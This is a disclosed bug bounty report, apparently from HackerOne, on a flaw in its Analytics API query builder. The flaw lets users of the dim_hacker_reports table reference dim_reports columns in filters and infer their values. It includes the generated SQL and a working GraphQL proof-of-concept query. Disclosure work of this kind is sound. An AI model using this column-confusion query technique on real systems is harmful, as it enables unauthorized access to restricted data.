# Users querying dim_hacker_reports table through Analytics API can determine data from dim_reports table using WHERE or HAVING query

## Report Details
- **Report ID**: 1824342
- **URL**: https://hackerone.com/reports/1824342
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-01-05T23:14:15.031Z
- **Disclosed**: 2023-02-22T22:01:36.026Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
The query builder for the Analytics API is vulnerable to a confusion attack. The `dim_reports` and `dim_hacker_reports` tables both pull their data from the `Analytics::DimReport` model. When applying a `WHERE` clause or `HAVING` clause with a `FILTER` in the HackerOne Analytics Query Language (HAQL), an attacker can create references to columns outside of the HAQL table schema. Assume that there is a table looking as following:

| report_id | is_triage_sla_missed |
| --- | --- |
| 27 | false |

And the following two schema definitions:

```ruby
'dim_reports': {
  'model': 'Analytics::DimReport',
  'columns': {
    'report_id': TYPE_NUMBER,
    'is_triage_sla_missed': TYPE_BOOLEAN,
  }
}
```

```
'dim_hacker_reports': {
  'model': 'Analytics::DimReport',
  'columns': {
    'report_id': TYPE_NUMBER,
  }
}
```

The `is_triage_sla_missed` column can only be queried through the `dim_reports` table, which reporters of a report do not have access to. However, when querying the `report_id` from either table, it results in the following SQL to being executed:

```sql
SELECT 
  "analytics"."dim_reports"."report_id" AS dim_hacker_reports__report_id 
FROM 
  "analytics"."dim_reports" 
WHERE 
  (
    "analytics"."dim_reports"."reporter_id" = ?
    AND "analytics"."dim_reports"."reporter_id" IS NOT NULL
  ) 
LIMIT 
  1000 OFFSET 0
```

As can be seen, there is no alias assigned to the `dim_reports` table. This can be used to confuse the query builder by using a reference to the `dim_reports` table, even though that table wasn't queried from. As an example:

```
query {
  analytics(queries: [
    {
      select: [
        {
          field: dim_hacker_reports__report_id
        }
      ]
      from: dim_hacker_reports
      where: {
        predicates: [
          {
            left: {
              ref: dim_reports__is_triage_sla_missed
            }
            function: eq
            right: {
              boolean: false
            }
          }
        ]
      }
    }
  ]) {
    keys
    values
  }
}
```

The `dim_reports__is_triage_sla_missed` reference should fail to be used, because `dim_reports` isn't being selected from or joined into the query. However, it misses this check, allowing the column to be referenced even though it isn't present in the `dim_hacker_reports` schema. Based on whether the query returns the row, the value of the column can be obtained:

**Data in column was guessed correctly**
{F2107683}

**Data in column does not match expectation**
{F2107684}

## Impact

Even though there isn't any sensitive data that can be queried through the `dim_reports` table schema today, this may cause unauthorized access to sensitive data in the future.

## Attachments
- Screenshot_2023-01-05_at_3.12.24_PM.png
- Screenshot_2023-01-05_at_3.13.10_PM.png
